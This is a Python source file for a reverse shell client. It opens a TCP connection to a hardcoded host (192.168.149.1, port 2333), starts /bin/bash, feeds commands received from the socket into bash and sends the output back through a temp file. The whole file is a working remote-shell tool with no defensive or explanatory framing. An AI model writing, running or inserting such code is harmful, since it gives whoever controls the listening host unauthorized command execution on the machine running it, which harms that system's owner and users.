from subprocess import Popen, PIPE
import socket
import threading
import time

remote_host = '192.168.149.1'
remote_port = 2333


class Client(object):
    def __init__(self):
        self.socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socks.connect((remote_host, remote_port))

        self.stdout_w = open('/tmp/stdout', 'wb+')
        self.stdout_w.write(b'')
        self.stdout_r = open('/tmp/stdout', 'rb+')
        self.bash = Popen('/bin/bash', shell=True, stdin=PIPE, stdout=self.stdout_w, stderr=self.stdout_w, bufsize=10)

    def run(self):
        t1 = threading.Thread(target=self.send_to_server)
        t1.setDaemon(True)
        t1.start()

        t2 = threading.Thread(target=self.retrieve_from_server)
        t2.setDaemon(True)
        t2.start()

        t1.join()
        t2.join()

    def retrieve_from_server(self):
        cmd_line = list()

        while True:
            try:
                cmd = self.socks.recv(4096)

                print(cmd)
                self.bash.stdin.write(cmd)

                if cmd.endswith(b'\n'):
                    self.bash.stdin.flush()
            except:
                pass

            time.sleep(0.1)

    def send_to_server(self):

        while True:
            newline = self.stdout_r.read()
            if newline:
                # print('[debug] stdout: {}'.format(newline.decode()))
                self.socks.send(newline)
                self.stdout_w.write(b'')

            time.sleep(0.1)

    def __del__(self):
        self.stdout_w.close()


def main():
    c = Client()
    c.run()


if __name__ == "__main__":
    main()
